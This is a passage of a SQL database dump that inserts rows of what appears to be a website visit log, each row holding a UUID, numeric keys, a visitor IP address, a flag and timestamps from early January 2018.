17:26:19',NULL),(380,'cc6904ec-6f35-4576-9f25-5504cce662cc',NULL,5,3,'142.44.151.76',NULL,NULL,NULL,1,'2018-01-02 17:26:23','2018-01-02 17:26:23',NULL),(381,'8c2ed6d2-0ee2-47a3-9a87-0623b616567d',NULL,5,3,'142.44.151.76',NULL,NULL,NULL,1,'2018-01-02 17:26:26','2018-01-02 17:26:26',NULL),(382,'51be978d-6594-49ca-b602-6e37a7ed3adb',NULL,8,70,'37.17.172.122',NULL,NULL,NULL,0,'2018-01-02 18:17:06','2018-01-02 18:17:06',NULL),(383,'485dac84-50a2-42fa-89b1-d3ce01c947c8',NULL,8,70,'37.17.172.122',NULL,NULL,NULL,0,'2018-01-02 18:17:39','2018-01-02 18:17:39',NULL),(384,'2b3db089-2728-4041-82b7-9eed1fa22580',NULL,8,70,'37.17.172.122',NULL,NULL,NULL,0,'2018-01-02 18:18:48','2018-01-02 18:18:48',NULL),(385,'6d74258d-9607-4f65-9775-43d1f31d5a71',NULL,8,70,'37.17.172.122',NULL,NULL,NULL,0,'2018-01-02 18:19:13','2018-01-02 18:19:13',NULL),(386,'27034930-de01-4755-8664-906ad8233a9f',NULL,5,4,'66.249.66.219',NULL,NULL,NULL,1,'2018-01-02 18:26:00','2018-01-02 18:26:00',NULL),(387,'4725c14d-9da9-4d27-9c97-40e5698b2188',NULL,8,70,'37.17.172.122',NULL,NULL,NULL,0,'2018-01-02 18:26:26','2018-01-02 18:26:26',NULL),(388,'980dd159-6c4f-428a-9263-3b1acf3159ea',NULL,8,70,'37.17.172.122',NULL,NULL,NULL,0,'2018-01-02 18:26:50','2018-01-02 18:26:50',NULL),(389,'38c1f856-d92f-47f1-be10-828647bf1aa6',NULL,6,9,'189.26.77.228',NULL,NULL,NULL,0,'2018-01-02 19:45:24','2018-01-02 19:45:24',NULL),(390,'f0474afd-8b77-47df-a159-8548af0156de',NULL,11,31,'137.74.114.163',NULL,NULL,NULL,0,'2018-01-02 22:35:12','2018-01-02 22:35:12',NULL),(391,'d5ce57d2-58d8-46f6-8033-c6084db99798',NULL,5,71,'194.58.115.168',NULL,NULL,NULL,1,'2018-01-02 23:05:29','2018-01-02 23:05:29',NULL),(392,'cfbd428a-4b48-46b9-9121-0f1de83eff41',NULL,5,71,'194.58.115.168',29,NULL,NULL,1,'2018-01-02 23:05:34','2018-01-02 23:05:34',NULL),(393,'36203fef-d6a7-454a-b813-54ba11843026',NULL,5,71,'194.58.115.168',25,NULL,NULL,1,'2018-01-02 23:05:38','2018-01-02 23:05:38',NULL),(394,'2ce6c371-d4dc-4fb2-99a8-4c31d96fb6ee',NULL,5,71,'194.58.115.168',8,NULL,NULL,1,'2018-01-02 23:05:41','2018-01-02 23:05:41',NULL),(395,'68d63394-bc6e-4f85-944b-907f7fe9d22a',NULL,5,71,'194.58.115.168',27,NULL,NULL,1,'2018-01-02 23:05:43','2018-01-02 23:05:43',NULL),(396,'247eebd7-1bb8-4b37-937b-1258a2397597',NULL,5,71,'194.58.115.168',26,NULL,NULL,1,'2018-01-02 23:05:46','2018-01-02 23:05:46',NULL),(397,'2b79c075-c1c2-4b52-9386-be1a13a30d8f',NULL,5,71,'194.58.115.168',30,NULL,NULL,1,'2018-01-02 23:05:48','2018-01-02 23:05:48',NULL),(398,'4fe4479c-385c-4020-b98d-552d1ac4d3e7',NULL,5,71,'194.58.115.168',31,NULL,NULL,1,'2018-01-02 23:05:51','2018-01-02 23:05:51',NULL),(399,'be0bc6f7-de87-40c0-90e3-1a923cdc0312',NULL,5,71,'194.58.115.168',32,NULL,NULL,1,'2018-01-02 23:05:53','2018-01-02 23:05:53',NULL),(400,'75f7901a-5338-495f-845f-6859b35bcdf7',NULL,5,71,'194.58.115.168',33,NULL,NULL,1,'2018-01-02 23:05:56','2018-01-02 23:05:56',NULL),(401,'0e7676d3-73be-4201-ae6b-acce9bf330c6',NULL,5,71,'194.58.115.168',34,NULL,NULL,1,'2018-01-02 23:05:58','2018-01-02 23:05:58',NULL),(402,'6bdbae6d-2c0e-4bc0-8bf3-b011681ed8d7',NULL,5,3,'5.9.62.130',NULL,NULL,NULL,1,'2018-01-03 00:20:17','2018-01-03 00:20:17',NULL),(403,'e5e90d8a-f5b4-4279-94f8-460981e8ccab',NULL,5,3,'5.9.62.130',NULL,NULL,NULL,1,'2018-01-03 00:20:23','2018-01-03 00:20:23',NULL),(404,'04d6f9ef-7211-417b-b0c1-0b33c715de39',NULL,5,3,'5.9.62.130',NULL,NULL,NULL,1,'2018-01-03 00:20:31','2018-01-03 00:20:31',NULL),(405,'90144ca0-ec43-4f9e-847d-41276e4c868f',NULL,24,72,'52.210.123.69',NULL,NULL,NULL,0,'2018-01-03 03:58:34','2018-01-03 00:28:34',NULL),(406,'e1091c7c-0859-4c6b-8f15-e3f2821abb05',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2018-01-03 00:34:47','2018-01-03 00:34:47',NULL),(407,'d01c3373-be8b-480f-b771-09c4e7864dc1',NULL,10,73,'109.86.210.25',11,NULL,NULL,0,'2018-01-03 03:15:11','2018-01-03 03:15:11',NULL),(408,'4ae4a646-adc5-4f8b-8f6e-5415b4232dc9',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2018-01-03 04:51:15','2018-01-03 04:51:15',NULL),(409,'4c367bea-897e-4f51-a7e6-00bf248b0f20',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2018-01-03 04:52:37','2018-01-03 04:52:37',NULL),(410,'cbcd22aa-ff60-4472-856d-5602bebc2db6',NULL,9,11,'42.236.10.71',11,NULL,NULL,1,'2018-01-03 06:37:58','2018-01-03 06:37:58',NULL),(411,'1ba50743-d761-40c4-bb55-ecbaf0fd0047',NULL,9,11,'42.236.10.78',12,NULL,NULL,1,'2018-01-03 06:37:58','2018-01-03 06:37:58',NULL),(412,'f9bb54fe-27fc-4ce9-a795-af681a74ca89',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:45:54','2018-01-03 06:45:54',NULL),(413,'0a4b3e43-7ad2-4d84-a802-b67d902ae58f',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:45:57','2018-01-03 06:45:57',NULL),(414,'ac22bb13-3072-4177-ade5-c20590dd4526',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:45:59','2018-01-03 06:45:59',NULL),(415,'01f4578c-1956-4aa1-a35e-bcbd695dec51',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:02','2018-01-03 06:46:02',NULL),(416,'deeeaa6a-3f85-4770-be06-33ac3a6edbca',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:04','2018-01-03 06:46:04',NULL),(417,'cb07b68c-4b07-495e-b8f6-527456bbe3a3',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:06','2018-01-03 06:46:06',NULL),(418,'52fd0da3-d23e-41fd-8922-d72f18f2c3ee',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:09','2018-01-03 06:46:09',NULL),(419,'d83f9801-af54-467c-bdde-ee32d963cbb0',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:11','2018-01-03 06:46:11',NULL),(420,'3454114f-c87a-4553-b1fd-3cee54a6abdf',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:14','2018-01-03 06:46:14',NULL),(421,'b22da000-2d63-493f-958e-fcf9192f0297',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:16','2018-01-03 06:46:16',NULL),(422,'3418e955-dcae-402a-bd11-af801d25e1dc',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:18','2018-01-03 06:46:18',NULL),(423,'f830975b-2752-4c72-b507-f0e28454220d',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:21','2018-01-03 06:46:21',NULL),(424,'7130aba6-3f34-4a96-898e-d9b008609fb4',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:23','2018-01-03 06:46:23',NULL),(425,'07a164d4-5edc-46d4-bfd8-c6e35ba7d5c2',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:26','2018-01-03 06:46:26',NULL),(426,'27362bd0-57e0-44a1-bd68-619917d3c8a4',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:28','2018-01-03 06:46:28',NULL),(427,'16b71875-194c-425f-b0bf-cccc1282faf6',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:30','2018-01-03 06:46:30',NULL),(428,'33acb53f-98fe-43d4-8088-6f8c02b8fdb2',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:33','2018-01-03 06:46:33',NULL),(429,'841addc5-18ff-443e-8642-122af0acc099',NULL,5,3,'88.198.66.230',NULL,NULL,NULL,1,'2018-01-03 06:46:35','2018-01-03 06:46:35',NULL),(430,'c4acafca-81bb-4d86-b3a1-2075a7f4e893',NULL,5,3,'5.9.156.43',NULL,NULL,NULL,1,'2018-01-03 09:23:21','2018-01-03 09:23:21',NULL),(431,'bd02589d-2258-49b5-9e45-bd1d4d0a19de',NULL,5,3,'5.9.156.43',NULL,NULL,NULL,1,'2018-01-03 09:23:24','2018-01-03 09:23:24',NULL),(432,'4172b314-d1cc-489f-a750-55ba691c32fb',NULL,5,3,'5.9.156.43',NULL,NULL,NULL,1,'2018-01-03 09:23:28','2018-01-03 09:23:28',NULL),(433,'105ae27c-576e-44f7-accc-9f8da36806c5',NULL,5,3,'162.210.196.100',NULL,NULL,NULL,1,'2018-01-03 09:45:04','2018-01-03 09:45:04',NULL),(434,'e96ced94-37f3-4f3f-bf24-fe0f1e726bb1',NULL,9,11,'42.236.55.21',11,NULL,NULL,1,'2018-01-03 13:06:43','2018-01-03 13:06:43',NULL),(435,'05b723f0-4036-4ac7-b9c9-c8113ab3e727',NULL,9,11,'42.236.99.130',12,NULL,NULL,1,'2018-01-03 13:08:03','2018-01-03 13:08:03',NULL),(436,'7145fd97-9662-4280-932d-b16f19a430c3',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2018-01-03 14:20:05','2018-01-03 14:20:05',NULL),(437,'e755d5b7-4302-4143-b772-d70d649caa0a',NULL,11,15,'89.36.58.97',14,NULL,NULL,0,'2018-01-03 15:25:45','2018-01-03 15:25:45',NULL),(438,'0b92c79c-0b19-4269-a8cb-e71f9b3fa105',NULL,15,33,'207.46.13.14',NULL,NULL,NULL,1,'2018-01-03 15:28:50','2018-01-03 15:28:50',NULL),(439,'62a128c1-6e73-464f-b9ab-df178910861a',NULL,5,44,'142.234.115.155',24,NULL,NULL,1,'2018-01-03 15:32:48','2018-01-03 15:32:48',NULL),(440,'a9ba6b9a-6dc9-4842-bb9b-9bd6e616d454',NULL,6,9,'182.52.97.116',NULL,NULL,NULL,0,'2018-01-03 16:07:54','2018-01-03 16:07:54',NULL),(441,'e125b573-2a33-4eab-82cd-d90db7f5c304',NULL,18,64,'37.63.220.32',NULL,NULL,NULL,0,'2018-01-03 16:40:24','2018-01-03 16:40:24',NULL),(442,'32130a3e-1a65-4008-927b-e3a102587b24',NULL,5,47,'195.146.37.19',NULL,NULL,NULL,1,'2018-01-03 16:52:50','2018-01-03 16:52:50',NULL),(443,'93efbe6d-871d-400b-81a3-9afe1f1c6e5d',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2018-01-03 17:00:07','2018-01-03 17:00:07',NULL),(444,'71fe8b0a-87e4-4db9-af00-88c6da273707',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:23','2018-01-03 17:41:23',NULL),(445,'323859bd-1ab1-4b65-9e98-82ed6a36e9ea',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:26','2018-01-03 17:41:26',NULL),(446,'f94763a1-73e1-448c-869d-42dadfe6d71c',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:29','2018-01-03 17:41:29',NULL),(447,'08a1507a-eafc-4be3-abfe-31c2a7dd2ed5',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:32','2018-01-03 17:41:32',NULL),(448,'fad08b6e-b8e4-4ef4-89f6-1fce808729d9',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:35','2018-01-03 17:41:35',NULL),(449,'59c67f03-f269-4ea1-9a1d-a4aa73391930',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:37','2018-01-03 17:41:37',NULL),(450,'5f50b0ea-afba-4852-a0d3-9361ae4c2bec',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:41','2018-01-03 17:41:41',NULL),(451,'60f4e861-657f-447e-924f-144cb2257a1c',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:43','2018-01-03 17:41:43',NULL),(452,'7c802b64-188c-496a-ba69-c18805b6babc',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:46','2018-01-03 17:41:46',NULL),(453,'1b936d9e-e039-466a-ab71-e161a9b99118',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:49','2018-01-03 17:41:49',NULL),(454,'ea4a8fa4-6762-46ae-88e4-a71cb012adc2',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:51','2018-01-03 17:41:51',NULL),(455,'e380f496-ce82-4243-b016-4825799febfd',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:54','2018-01-03 17:41:54',NULL),(456,'470013f4-63de-4d26-998a-cc480cd62456',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:41:57','2018-01-03 17:41:57',NULL),(457,'56d1d908-ff61-4978-9210-65f8160c5a7e',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:42:00','2018-01-03 17:42:00',NULL),(458,'e1097731-f72a-4af7-ba8d-9ad1fab3f878',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:42:02','2018-01-03 17:42:02',NULL),(459,'5979af12-98da-4049-878f-0076e9265d5a',NULL,5,2,'91.209.51.22',NULL,NULL,NULL,1,'2018-01-03 17:42:04','2018-01-03 17:42:04',NULL),(460,'c1546530-48e0-4760-987d-442bcaf74e82',NULL,5,4,'66.249.64.221',NULL,NULL,NULL,1,'2018-01-03 18:33:17','2018-01-03 18:33:17',NULL),(461,'192e55bf-53d2-4dd9-92f5-0357ccefb7d0',NULL,15,35,'131.253.25.156',NULL,NULL,NULL,1,'2018-01-03 21:41:23','2018-01-03 21:41:23',NULL),(462,'98526aa2-d6b6-474c-a43e-56ea9734cfc4',NULL,5,17,'37.9.113.62',NULL,NULL,NULL,1,'2018-01-03 23:49:51','2018-01-03 23:49:51',NULL),(463,'0cf92ad6-17eb-45b6-86b3-bd72d0d4f23f',NULL,5,17,'37.9.113.62',NULL,NULL,NULL,1,'2018-01-03 23:51:00','2018-01-03 23:51:00',NULL),(464,'0fe9d28c-7ced-4494-ace0-c57f1a97f8dd',NULL,11,31,'137.74.114.163',NULL,NULL,NULL,0,'2018-01-04 00:55:45','2018-01-04 00:55:45',NULL),(465,'a636abe5-5247-4abf-9a94-37c9b693698d',NULL,5,2,'173.208.128.34',NULL,NULL,NULL,1,'2018-01-04 01:19:02','2018-01-04 01:19:02',NULL),(466,'0260def9-e028-49b4-b9d5-74f02daf18c4',NULL,5,2,'173.208.128.34',NULL,NULL,NULL,1,'2018-01-04 01:19:09','2018-01-04 01:19:09',NULL),(467,'dfa8069a-4024-459a-b765-a56448bed6f3',NULL,5,2,'173.208.128.34',NULL,NULL,NULL,1,'2018-01-04 01:19:18','2018-01-04 01:19:18',NULL),(468,'72673247-e863-4391-bcd3-57f796164c4a',NULL,5,44,'74.115.214.137',24,NULL,NULL,1,'2018-01-04 02:27:20','2018-01-04 02:27:20',NULL),(469,'f32fe11f-2014-4591-b9c5-adf9d3f8372e',NULL,5,44,'74.115.214.132',NULL,NULL,NULL,1,'2018-01-04 02:27:21','2018-01-04 02:27:21',NULL),(470,'68bd9e46-fee5-46ff-b30b-a66ec55294cf',NULL,5,18,'207.46.13.168',NULL,NULL,NULL,1,'2018-01-04 04:16:33','2018-01-04 04:16:33',NULL),(471,'29bede84-c33a-4ddc-a692-ddfc4d74ae21',NULL,11,74,'82.202.249.104',NULL,NULL,NULL,0,'2018-01-04 05:15:05','2018-01-04 05:15:05',NULL),(472,'89479be6-41b7-4f4b-b54c-e6b02da9c011',NULL,9,11,'42.236.39.171',12,NULL,NULL,1,'2018-01-04 06:33:43','2018-01-04 06:33:43',NULL),(473,'efd63014-39dd-4e7d-b4da-b4dc6fe22f82',NULL,9,11,'42.236.39.171',11,NULL,NULL,1,'2018-01-04 06:33:43','2018-01-04 06:33:43',NULL),(474,'fe08b877-0d73-4957-b816-e66e11dbabd5',NULL,23,75,'46.183.144.48',11,NULL,NULL,0,'2018-01-04 07:09:10','2018-01-04 07:09:10',NULL),(475,'a6808557-ccaf-48ca-a7ae-992e996a1e01',NULL,13,29,'13.56.229.65',NULL,NULL,NULL,0,'2018-01-04 07:45:01','2018-01-04 07:45:01',NULL),(476,'f7c88cfc-567f-455e-91a0-1610f146f38b',NULL,5,4,'66.249.64.217',NULL,NULL,NULL,1,'2018-01-04 10:27:03','2018-01-04 10:27:03',NULL),(477,'711b5e54-3063-4c4d-b1d2-2fa1788307a8',NULL,5,3,'199.58.86.211',NULL,NULL,NULL,1,'2018-01-04 12:55:53','2018-01-04 12:55:53',NULL),(478,'ca879ae8-5eef-4054-a0b8-65fc4823ac6c',NULL,11,41,'180.169.191.142',NULL,NULL,NULL,0,'2018-01-04 15:49:47','2018-01-04 15:49:47',NULL),(479,'e7d6da8b-499f-4dd4-9e57-c95b53d098dc',NULL,25,76,'5.72.124.39',12,NULL,NULL,0,'2018-01-04 19:36:40','2018-01-04 16:06:40',NULL),(480,'2e327801-4c1a-42ac-97c1-0258fe232443',NULL,5,77,'178.255.215.78',NULL,NULL,NULL,1,'2018-01-04 16:08:53','2018-01-04 16:08:53',NULL),(481,'838a064a-da28-43b7-b642-58ce7478eb54',NULL,5,3,'144.76.8.66',NULL,NULL,NULL,1,'2018-01-04 18:40:47','2018-01-04 18:40:47',NULL),(482,'f5c1909c-5dec-4ce3-af8a-f2b660d0b12b',NULL,5,3,'144.76.8.66',NULL,NULL,NULL,1,'2018-01-04 18:41:46','2018-01-04 18:41:46',NULL),(483,'c8d8c284-95e6-4022-aa4f-4b5e040d7e2d',NULL,5,3,'144.76.8.66',NULL,NULL,NULL,1,'2018-01-04 18:41:57','2018-01-04 18:41:57',NULL),(484,'4e8bedc1-9af1-4366-8a6f-95eb9326b2d1',NULL,5,16,'220.181.108.175',NULL,NULL,NULL,1,'2018-01-04 18:52:18','2018-01-04 18:52:18',NULL),(485,'68dec219-54eb-4838-8949-6423c1ca05b4',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2018-01-04 20:28:40','2018-01-04 20:28:40',NULL),(486,'5b86b59d-bfa7-49a5-9e37-bd698da67ac4',NULL,5,44,'172.241.151.27',23,NULL,NULL,1,'2018-01-04 20:39:52','2018-01-04 20:39:52',NULL),(487,'baee7586-82d3-4849-99f6-326fb8e5ccd0',NULL,5,78,'85.93.91.84',NULL,NULL,NULL,1,'2018-01-04 21:22:01','2018-01-04 21:22:01',NULL),(488,'4df3008b-34db-4643-b201-f29ecbfdeaf8',NULL,9,79,'195.22.125.116',11,NULL,NULL,0,'2018-01-04 21:30:27','2018-01-04 21:30:27',NULL),(489,'2008134d-f1e1-4a77-b6be-e6edbe4cf74e',NULL,5,3,'144.76.19.144',NULL,NULL,NULL,1,'2018-01-04 22:40:12','2018-01-04 22:40:12',NULL),(490,'f6a086ad-6f8c-4044-a83f-cc92bb2e9a30',NULL,5,3,'144.76.19.144',NULL,NULL,NULL,1,'2018-01-04 22:40:14','2018-01-04 22:40:14',NULL),(491,'d37403fc-d183-4edc-8617-dfd54861a850',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2018-01-04 23:02:59','2018-01-04 23:02:59',NULL),(492,'1dcbf3cd-633f-482d-9a1e-9c286fa3fc41',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2018-01-04 23:03:02','2018-01-04 23:03:02',NULL),(493,'d80f00b9-9f5e-4a2e-a1e8-add0204e6dd3',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2018-01-04 23:03:06','2018-01-04 23:03:06',NULL),(494,'e89a7932-85e5-4df0-b725-4e794b398046',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2018-01-04 23:03:14','2018-01-04 23:03:14',NULL),(495,'3a55741c-2e72-45c4-8b41-7699f70a92d7',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2018-01-04 23:03:18','2018-01-04 23:03:18',NULL),(496,'80f7c503-bfb0-4d59-8db2-3cefd079ee31',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2018-01-04 23:03:21','2018-01-04 23:03:21',NULL),(497,'29c1b643-f752-473c-a9eb-f28c089a9515',NULL,5,13,'68.180.229.155',NULL,NULL,NULL,1,'2018-01-05 00:01:40','2018-01-05 00:01:40',NULL),(498,'4b12deb0-a24c-4f0b-a452-373ea4de67d2',NULL,5,44,'74.115.214.154',24,NULL,NULL,1,'2018-01-05 00:54:25','2018-01-05 00:54:25',NULL),(499,'1fb48d3b-e098-45ef-a3a6-42b42cf5dfc7',NULL,15,33,'207.46.13.36',NULL,NULL,NULL,1,'2018-01-05 00:59:07','2018-01-05 00:59:07',NULL),(500,'c1d68a35-99ab-440d-937d-44aa23837b66',NULL,5,58,'31.184.135.121',12,NULL,NULL,1,'2018-01-05 04:33:00','2018-01-05 04:33:00',NULL),(501,'0c0cb894-d4cd-4dea-8756-05333143dc13',NULL,11,45,'5.121.238.125',14,NULL,NULL,0,'2018-01-05 08:09:40','2018-01-05 04:39:40',NULL),(502,'8a0e9864-d245-434c-9a28-bc3facde1cd8',NULL,10,80,'110.83.60.52',NULL,NULL,NULL,0,'2018-01-05 06:07:15','2018-01-05 06:07:15',NULL),(503,'389e9e76-a0dd-48d8-94fa-b9e963b19f22',NULL,9,12,'42.236.10.110',11,NULL,NULL,1,'2018-01-05 06:23:18','2018-01-05 06:23:18',NULL),(504,'a260b172-7bb1-44f7-a8b5-8d52211c9af5',NULL,11,45,'5.121.226.198',12,NULL,NULL,0,'2018-01-05 10:34:57','2018-01-05 07:04:57',NULL),(505,'2ec26e1b-30a7-40d8-8cf8-06f8f1e5ad28',NULL,5,81,'46.181.48.122',NULL,NULL,NULL,0,'2018-01-05 06:50:15','2018-01-05 06:50:15',NULL),(506,'95f469a3-5051-4f5e-b08c-ec6f597d8911',NULL,5,82,'204.12.155.201',NULL,NULL,NULL,1,'2018-01-05 06:50:17','2018-01-05 06:50:17',NULL),(507,'2d7be442-255c-4589-9324-413b94591241',NULL,26,83,'187.110.238.133',NULL,NULL,NULL,1,'2018-01-05 06:50:18','2018-01-05 06:50:18',NULL),(508,'d73a7dc4-cc13-4eaa-a139-66bae8183f0d',NULL,5,82,'103.71.178.242',NULL,NULL,NULL,1,'2018-01-05 06:52:01','2018-01-05 06:52:01',NULL),(509,'7863fc65-53c0-407c-900d-c48a1f96cc4c',NULL,27,84,'122.183.242.54',NULL,NULL,NULL,0,'2018-01-05 06:53:40','2018-01-05 06:53:40',NULL),(510,'7da1f2ec-a0ea-455e-af7e-fc207ccfcde8',NULL,5,21,'106.120.173.74',NULL,NULL,NULL,1,'2018-01-05 07:57:19','2018-01-05 07:57:19',NULL),(511,'80ca8551-28aa-4f72-a722-1accb293c7da',NULL,5,22,'194.187.170.136',NULL,NULL,NULL,1,'2018-01-05 08:00:27','2018-01-05 08:00:27',NULL),(512,'5f7ad338-04a3-4c29-881f-8308e22d4758',NULL,5,4,'66.249.64.219',NULL,NULL,NULL,1,'2018-01-05 08:57:57','2018-01-05 08:57:57',NULL),(513,'f5f0dcb1-2b55-4edf-8647-628adbc9a0e9',NULL,11,85,'207.254.40.146',NULL,NULL,NULL,0,'2018-01-05 12:31:31','2018-01-05 09:01:31',NULL),(514,'3ba9173c-5517-46ff-a3ac-46ed796d60a3',NULL,13,29,'13.56.229.65',NULL,NULL,NULL,0,'2018-01-05 09:30:10','2018-01-05 09:30:10',NULL),(515,'5f06d733-60ca-4666-930d-55539b5a6a65',NULL,9,86,'185.36.102.114',36,NULL,NULL,0,'2018-01-05 09:36:40','2018-01-05 09:36:40',NULL),(516,'c8a29441-e1c5-4ea4-b8c2-8340ed12fe83',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 10:11:44','2018-01-05 10:11:44',NULL),(517,'3bca388d-e415-432d-a275-41b5e4e75f3c',NULL,21,51,'176.116.19.54',NULL,NULL,NULL,0,'2018-01-05 10:40:34','2018-01-05 10:40:34',NULL),(518,'50cdb392-6f89-49de-860a-4fa5d564050f',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 11:00:13','2018-01-05 11:00:13',NULL),(519,'7e2ab4ff-a0f2-4121-b5ad-abc69b500669',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 11:00:26','2018-01-05 11:00:26',NULL),(520,'d4a4fffd-245f-45fa-bf28-07759ad94327',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 11:00:42','2018-01-05 11:00:42',NULL),(521,'3fe6899b-5f22-47c2-847d-6705894baab4',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 11:00:49','2018-01-05 11:00:49',NULL),(522,'4759163b-510f-4737-b87b-563db1f1e69b',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 11:00:56','2018-01-05 11:00:56',NULL),(523,'6ee7f746-63d9-4e7f-9662-71c2ed6e8a9c',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 11:01:13','2018-01-05 11:01:13',NULL),(524,'46ee43d4-a164-45f6-974e-363dd97d87d9',NULL,5,3,'107.150.59.98',NULL,NULL,NULL,1,'2018-01-05 11:01:24','2018-01-05 11:01:24',NULL),(525,'2a1027ed-b433-44b0-ba76-d7755205e971',NULL,5,3,'178.203.120.211',NULL,NULL,NULL,1,'2018-01-05 12:06:08','2018-01-05 12:06:08',NULL),(526,'9b79e92a-dc89-4668-a157-af2fa2edfd39',NULL,18,64,'37.63.220.32',20,NULL,NULL,0,'2018-01-05 15:45:14','2018-01-05 12:15:14',NULL),(527,'80501f14-7992-47f1-a087-40ed594c5249',NULL,11,15,'151.240.174.156',37,NULL,NULL,0,'2018-01-05 15:48:26','2018-01-05 12:18:26',NULL),(528,'5ac5e0be-8262-41a9-b833-30846929be90',NULL,6,9,'197.16.52.101',NULL,NULL,NULL,0,'2018-01-05 12:23:57','2018-01-05 12:23:57',NULL),(529,'f1852f03-305f-4234-88a4-79c76dba477a',NULL,9,11,'42.236.101.234',11,NULL,NULL,1,'2018-01-05 13:12:26','2018-01-05 13:12:26',NULL),(530,'02f2abc7-0307-493a-ad37-a58046cb0ad8',NULL,9,11,'42.236.55.21',12,NULL,NULL,1,'2018-01-05 13:12:57','2018-01-05 13:12:57',NULL),(531,'380c012c-d8ed-481d-a0d1-7db6570a4b97',NULL,5,4,'66.249.64.192',NULL,NULL,NULL,1,'2018-01-05 13:40:42','2018-01-05 13:40:42',NULL),(532,'791c766a-470f-4a29-ab3d-300621325f72',NULL,9,87,'66.240.192.138',NULL,NULL,NULL,0,'2018-01-05 14:39:09','2018-01-05 14:39:09',NULL),(533,'1e7fea93-c376-4cc3-ada2-dd3000947759',NULL,5,3,'199.58.86.209',NULL,NULL,NULL,1,'2018-01-05 14:58:36','2018-01-05 14:58:36',NULL),(534,'d63303e4-33bc-4f66-8dbe-e6c769fe71fe',NULL,5,2,'192.151.157.210',NULL,NULL,NULL,1,'2018-01-05 15:48:28','2018-01-05 15:48:28',NULL),(535,'aac54d3a-75cf-4550-837c-93013ffb5890',NULL,5,2,'192.151.157.210',NULL,NULL,NULL,1,'2018-01-05 15:48:37','2018-01-05 15:48:37',NULL),(536,'02a081da-9895-4de6-88fb-381d43c138f1',NULL,5,2,'192.151.157.210',NULL,NULL,NULL,1,'2018-01-05 15:48:54','2018-01-05 15:48:54',NULL),(537,'4449baf9-e16b-424f-884b-0d4041386c18',NULL,15,33,'207.46.13.181',NULL,NULL,NULL,1,'2018-01-05 16:29:20','2018-01-05 16:29:20',NULL),(538,'7fd2a788-9485-4288-a5ce-9340af3212a3',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-05 16:29:26','2018-01-05 16:29:26',NULL),(539,'0c32e710-015c-416b-8cc6-8fcc32517c82',NULL,5,13,'68.180.229.113',NULL,NULL,NULL,1,'2018-01-05 16:31:35','2018-01-05 16:31:35',NULL),(540,'91a5fc8d-fac9-40a3-9ade-7964578fdb98',NULL,8,68,'217.69.143.69',NULL,NULL,NULL,1,'2018-01-05 16:47:02','2018-01-05 16:47:02',NULL),(541,'6acd3d80-4052-43e5-af69-ff4204ed4754',NULL,11,88,'91.251.246.130',12,NULL,NULL,0,'2018-01-05 20:41:46','2018-01-05 